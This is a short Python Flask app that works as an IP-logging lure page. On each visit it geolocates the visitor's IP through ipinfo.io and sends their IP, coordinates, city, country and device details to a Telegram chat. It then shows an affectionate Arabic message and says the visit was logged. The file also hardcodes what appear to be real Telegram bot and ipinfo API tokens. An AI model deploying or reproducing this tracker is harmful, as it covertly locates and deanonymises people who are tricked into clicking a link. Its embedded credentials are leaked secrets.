from flask import Flask, request
import requests

app = Flask(__name__)

bot_token = "7396648563:AAHcApu4FRLRRbVVk3dBiMwrhPxq5MuAL_w"
chat_id = "1801208219"
ipinfo_token = "6fdfcd8ec87904"


def send_telegram_message(message):
    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    data = {"chat_id": chat_id, "text": message}
    requests.post(url, data=data)


def get_ip_info(ip):
    response = requests.get(f"https://ipinfo.io/{ip}?token={ipinfo_token}")
    return response.json()


@app.route('/')
def home():
    user_agent = request.headers.get('User-Agent')
    user_ip = request.remote_addr
    ip_info = get_ip_info(user_ip)
    location = ip_info.get('loc', 'Unknown location')
    city = ip_info.get('city', 'Unknown city')
    region = ip_info.get('region', 'Unknown region')
    country = ip_info.get('country', 'Unknown country')

    message = (f"New visitor:\n"
               f"IP: {user_ip}\n"
               f"Location: {location}\n"
               f"City: {city}\n"
               f"Region: {region}\n"
               f"Country: {country}\n"
               f"Device: {user_agent}")
    send_telegram_message(message)

    return f"""
    <html>
        <body>
            <h1 style="text-align:center; font-size:20px;">انا احبك اينما كنت ومهما كنت 🤎🤎</h1>
            <p style="text-align:center; font-size:10px;">osama</p>
            <p>Your visit has been logged.</p>
        </body>
    </html>
    """


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
